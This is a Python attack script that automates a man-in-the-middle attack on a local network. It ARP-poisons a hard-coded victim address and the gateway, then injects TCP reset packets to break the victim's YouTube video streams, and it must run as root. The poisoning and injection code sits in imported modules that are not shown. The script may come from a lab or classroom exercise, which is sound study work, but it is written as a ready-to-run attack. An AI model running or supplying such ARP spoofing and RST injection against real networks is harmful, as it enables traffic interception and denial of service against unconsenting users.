#!/usr/bin/env python3

import os
import sys
import time
import socket
import netifaces
from pathlib import Path

# Use the venv's packages if available
sys.path.insert(0, str(Path(__file__).parent / "src"))

from config_manager import ConfigManager
from network_utils import NetworkUtils
from arp_poisoner import ARPPoisoner
from packet_monitor import PacketMonitor

def get_local_ip_and_iface():
    """Get the local IP and interface used for default gateway."""
    gws = netifaces.gateways()
    default_gw = gws['default'][netifaces.AF_INET]
    iface = default_gw[1]
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip, iface

def get_gateway_ip():
    """Get the default gateway IP."""
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]

def main():
    print("=== Automated YouTube TCP Reset Attack ===")
    # 1. Use provided victim IP
    victim_ip = "192.168.0.121" 
    # victim_ip = "10.62.179.113" 
    local_ip, interface = get_local_ip_and_iface()
    gateway_ip = get_gateway_ip()
    print(f"[INFO] Victim IP: {victim_ip}")
    print(f"[INFO] Attacker Local IP: {local_ip}")
    print(f"[INFO] Network Interface: {interface}")
    print(f"[INFO] Gateway IP: {gateway_ip}")

    # 2. Set up ARP poisoner and packet monitor
    print("[INFO] Initializing ARP poisoner and packet monitor...")
    arp_poisoner = ARPPoisoner(
        target_ip=victim_ip,
        gateway_ip=gateway_ip,
        interface=interface,
        interval=2
    )
    packet_monitor = PacketMonitor(
        target_ip=victim_ip,
        interface=interface
    )

    attack_duration = 100  # seconds (5 minutes)

    try:
        # 3. Start ARP poisoning
        print("[INFO] Starting ARP poisoning...")
        if not arp_poisoner.start_poisoning():
            print("[ERROR] Failed to start ARP poisoning.")
            return

        print("[INFO] Waiting 5 seconds for ARP poisoning to take effect...")
        time.sleep(5)

        # 4. Start packet monitoring and RST injection
        print("[INFO] Starting packet monitoring and RST injection...")
        if not packet_monitor.start_monitoring():
            print("[ERROR] Failed to start packet monitoring.")
            arp_poisoner.stop_poisoning()
            return

        print("\n=== Attack is ACTIVE! ===")
        print("On the victim laptop (192.168.0.121), open YouTube in a browser and play a video.")
        print("You should see RST injections and video disruption in the browser.")
        print(f"Attack will automatically stop after {attack_duration} seconds.")
        print("Press Ctrl+C to stop the attack and restore the network early.\n")

        # 5. Run for a fixed duration
        start_time = time.time()
        while time.time() - start_time < attack_duration:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user.")

    finally:
        print("[INFO] Stopping attack and restoring network...")
        packet_monitor.stop_monitoring()
        arp_poisoner.stop_poisoning()
        print("[INFO] Attack stopped. Network restored.")

if __name__ == "__main__":
    # Must be run as root
    if os.geteuid() != 0:
        print("This script must be run as root. Use: sudo venv/bin/python auto_youtube_rst_attack.py")
        sys.exit(1)
    main() 